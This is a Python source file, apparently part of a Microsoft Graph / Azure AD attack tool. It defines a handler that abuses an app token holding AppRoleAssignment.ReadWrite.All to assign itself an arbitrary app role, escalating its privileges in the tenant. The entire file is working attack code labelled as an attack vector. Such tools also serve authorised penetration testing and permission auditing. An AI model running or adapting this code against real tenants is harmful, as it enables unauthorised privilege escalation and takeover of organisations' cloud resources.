from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.app_assign_handler')


class AppAssign_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if ("Application.Read.All" in request.roles) and ("AppRoleAssignment.ReadWrite.All" in request.roles):
            status = False
            attack_name = "AppAssignVectors"
            message = ""
            error = "AppAssignVectors - failed"
            conf = request.attack_config['appAssignment']
            logger.debug("Application.Read.All - Allows the app to read all applications and service principals without a signed-in user.")
            logger.debug("AppRoleAssignment.ReadWrite.All - Manage app permission grants and app role assignments.")

            logger.debug("Attack vector - Allows the app to manage permission grants for application permissions to any API (including Microsoft Graph) and application assignments for any app, without a signed-in user.")
            try:
                create_message_URL = "https://graph.microsoft.com/beta/servicePrincipals/" + conf["clientId"] + "/appRoleAssignedTo"
                message_obj = {
                "appRoleId": conf["roleId"],
                "resourceId": conf["ResourceId"],
                "principalId": conf["clientId"]
                }

                result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                if result.status_code == 201:
                    message += "Added role to %s\n" % (conf["clientId"])
                    status = True
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in AppAssign_Handler function")

            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))



        return super().handle(request,responses)
            
